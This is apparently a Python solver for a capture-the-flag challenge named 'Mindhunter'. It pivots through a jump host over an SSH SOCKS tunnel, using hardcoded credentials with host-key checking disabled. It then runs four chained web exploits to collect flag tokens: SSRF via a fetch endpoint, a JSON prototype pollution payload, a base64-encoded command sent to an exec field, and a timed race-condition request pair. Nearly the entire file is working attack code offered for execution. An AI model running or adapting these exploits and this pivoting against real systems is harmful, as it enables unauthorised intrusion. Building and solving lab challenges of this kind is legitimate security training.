#!/usr/bin/env python3
"""
Mindhunter automated solver.

Recovers all four tokens by pivoting through the `perspective` jump host with an
SSH dynamic SOCKS proxy, then chaining the four web exploits (mind -> body ->
soul -> peace). Designed to run from the Kali workstation, from the jump host, or
from a helper container attached to `competitor_net`.

Usage:
    python3 solve.py --ssh-host perspective --ssh-user user --ssh-pass tartans

The solver establishes its own tunnel with `ssh -D` (via sshpass) unless
--socks-port points at an already-running proxy. All target requests are routed
through the tunnel (socks5h), so name resolution and the source address are those
of the pivot -- exactly what the mirrors' access control requires.
"""

import argparse
import base64
import json
import re
import subprocess
import sys
import time

import requests

STATIC_ENDPOINTS = [
    "access", "activity", "admin", "admin_panel", "analytics", "api", "audit",
    "audit_log", "backup", "billing", "cache", "cart", "checkout", "config",
    "customer", "dashboard", "data", "database", "debug", "developer", "download",
    "email", "events", "export", "file", "help", "hooks", "import", "integrations",
    "jobs", "login", "logout", "logs", "manual", "messages", "monitor",
    "notifications", "order", "payment", "permissions", "preferences", "profile",
    "queue", "renew", "report", "reset", "restore", "roles", "search", "security",
    "server_status", "sessions", "settings", "status", "subscription", "support",
    "sync", "system", "team", "tokens", "update", "upload", "user", "user_settings",
    "verification", "webhooks", "worker", "workspace",
]


def log(msg):
    print(msg, file=sys.stderr, flush=True)


def start_tunnel(host, user, password, port):
    """Bring up an SSH dynamic SOCKS proxy through the pivot."""
    cmd = [
        "sshpass", "-p", password,
        "ssh", "-f", "-N", "-D", str(port),
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ExitOnForwardFailure=yes",
        f"{user}@{host}",
    ]
    log(f"[*] Establishing SOCKS tunnel: ssh -D {port} {user}@{host}")
    subprocess.run(cmd, check=True)
    time.sleep(2)


def session(port):
    s = requests.Session()
    s.proxies = {
        "http": f"socks5h://127.0.0.1:{port}",
        "https": f"socks5h://127.0.0.1:{port}",
    }
    return s


def discover_endpoints(s, base):
    try:
        r = s.get(f"{base}/explorer", timeout=10)
        found = re.findall(r'"([a-z_]+)"\s*:', r.text)
        eps = sorted(set(found) | set(STATIC_ENDPOINTS))
        return eps
    except Exception as e:  # noqa: BLE001
        log(f"[!] explorer scrape failed ({e}); using static list")
        return STATIC_ENDPOINTS


def visit_all(s, base, headers):
    """Touch every endpoint so the mirror's 'magic' pre-requisites are met."""
    eps = discover_endpoints(s, base)
    hits = 0
    for ep in eps:
        try:
            r = s.get(f"{base}/{ep}", headers=headers, timeout=10)
            if r.status_code in (200, 403, 305) and "perspective" in r.text:
                hits += 1
        except Exception:  # noqa: BLE001
            pass
    log(f"[*] Visited {len(eps)} endpoints on {base} ({hits} magic hits)")


def solve_mind(s, host):
    base = f"http://{host}:5001"
    log("[1] mind / SSRF")
    visit_all(s, base, {})
    r = s.get(f"{base}/fetch", params={"url": f"http://{host}:5001"}, timeout=15)
    data = r.json()
    token = data.get("\U0001fa99 token 1")
    log(f"    token1 = {token}")
    return token


def solve_body(s, host, token1):
    base = f"http://{host}:5002"
    log("[2] body / prototype pollution")
    headers = {"X-Forwarded-Mind": token1, "X-Perspective": "resilience"}
    visit_all(s, base, headers)
    payload = {"meta": {"__proto__": {"polluted": "true"}}}
    r = s.post(f"{base}/stop", headers={**headers, "Content-Type": "application/json"},
               data=json.dumps(payload), timeout=15)
    data = r.json()
    token = data.get("\U0001fa99 token 2")
    log(f"    token2 = {token}")
    return token


def solve_soul(s, host, token1, token2):
    base = f"http://{host}:5003"
    log("[3] soul / encoded command")
    headers = {
        "X-Forwarded-Mind": token1,
        "X-Forwarded-Body": token2,
        "X-Perspective": "awakened",
    }
    visit_all(s, base, headers)
    cmd = base64.b64encode(b"soul").decode()
    payload = {"task": {"payload": {"exec": {"cmd": cmd}}}}
    s.post(f"{base}/encode", headers={**headers, "Content-Type": "application/json"},
           data=json.dumps(payload), timeout=20)
    r = s.get(f"{base}/download_token", timeout=15)
    m = re.search(r"(PCCC\{[^}]+\})", r.text)
    token = m.group(1) if m else None
    log(f"    token3 = {token}")
    return token


def solve_peace(s, host, token1, token2, token3):
    base = f"http://{host}:5004"
    log("[4] peace / race condition (two PATCHes ~10s apart)")
    headers = {
        "X-Forwarded-Mind": token1,
        "X-Forwarded-Body": token2,
        "X-Forwarded-Soul": token3,
        "X-Perspective": "acceptance",
        "Content-Type": "application/json",
    }
    visit_all(s, base, headers)
    s.patch(f"{base}/timeout", headers=headers, timeout=15)
    time.sleep(10)
    r = s.patch(f"{base}/timeout", headers=headers, timeout=15)
    data = r.json()
    token = data.get("\U0001fa99 token")
    log(f"    token4 = {token}")
    return token


def main():
    ap = argparse.ArgumentParser(description="Mindhunter solver")
    ap.add_argument("--ssh-host", default="perspective")
    ap.add_argument("--ssh-user", default="user")
    ap.add_argument("--ssh-pass", default="tartans")
    ap.add_argument("--socks-port", type=int, default=9050)
    ap.add_argument("--mirror-host", default="mirror",
                    help="hostname stem for the mirrors as seen from the pivot")
    ap.add_argument("--no-tunnel", action="store_true",
                    help="assume a SOCKS proxy is already listening on --socks-port")
    args = ap.parse_args()

    if not args.no_tunnel:
        start_tunnel(args.ssh_host, args.ssh_user, args.ssh_pass, args.socks_port)

    s = session(args.socks_port)

    # Each mirror is its own host; from the pivot they resolve as mirror1..mirror4.
    t1 = solve_mind(s, f"{args.mirror_host}1")
    t2 = solve_body(s, f"{args.mirror_host}2", t1)
    t3 = solve_soul(s, f"{args.mirror_host}3", t1, t2)
    t4 = solve_peace(s, f"{args.mirror_host}4", t1, t2, t3, )

    tokens = {"token1": t1, "token2": t2, "token3": t3, "token4": t4}
    print(json.dumps(tokens))
    if not all(tokens.values()):
        sys.exit(1)


if __name__ == "__main__":
    main()
